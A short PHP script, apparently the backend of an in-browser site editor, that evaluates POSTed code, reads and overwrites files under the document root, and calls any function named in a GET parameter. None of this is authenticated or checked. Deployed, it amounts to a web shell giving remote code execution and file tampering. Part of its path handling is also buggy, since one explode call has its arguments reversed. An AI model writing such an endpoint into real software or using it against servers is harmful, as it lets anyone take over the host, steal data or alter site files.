<?php
	function go_to_dir($url) {
      		chdir($_SERVER["DOCUMENT_ROOT"]);
		$url = explode("/", str_replace("http://", "", $url));
		if (count($url) > 1) {
			$urlbase = $url[1];
			$url = implode("/", array_slice($url, 1, count($url) - 2));
		} else {
			$url = $url[0];
		}
		chdir($url);
	}

	function get_file_name($url) {
		go_to_dir($url);
		$path = pathinfo($url);
		$fn = "";
		$files = scandir(".");
		if ($path["basename"] != $path["filename"]) {
			foreach($files as $f) {
				if ($path["basename"] == $f)
				$fn = $f;
			}
		} else {
			if (in_array("index.php", $files)) {
				$fn = "index.php";
			} else if (in_array("index.html", $files)) {
				$fn = "index.html";
			} else {
				foreach($files as $f) {
					$e = explode($f, ".");
				        if ($e[0] == "index")
          	    				$fn = $f;
	        		}
        		}
		}
		return $fn;
	}

	function evaluate() {
		go_to_dir($_GET["url"]);
		eval("?>" . $_POST["code"] . "<?php ");
	}
	
	function getSource() {
		/*$url = explode("/", str_replace("http://", "", $url));
		$url = implode("/", array_slice($url, 1));
		chdir($_SERVER["DOCUMENT_ROOT"]);
		echo htmlentities(file_get_contents($url));*/
		$fn = get_file_name($_GET["url"]);
		echo file_get_contents($fn);
	}

	function dr() {
		echo $_SERVER["DOCUMENT_ROOT"];
	}

	function save() {
		$fn = get_file_name($_GET["url"]);
		chmod($fn, 0666);
		if (fwrite(fopen($fn, "w"), $_POST["code"]))
			$status = "successful";
		else
			$status = "FAILURE";
		echo $status;
	}

	call_user_func($_GET["a"]);
?>
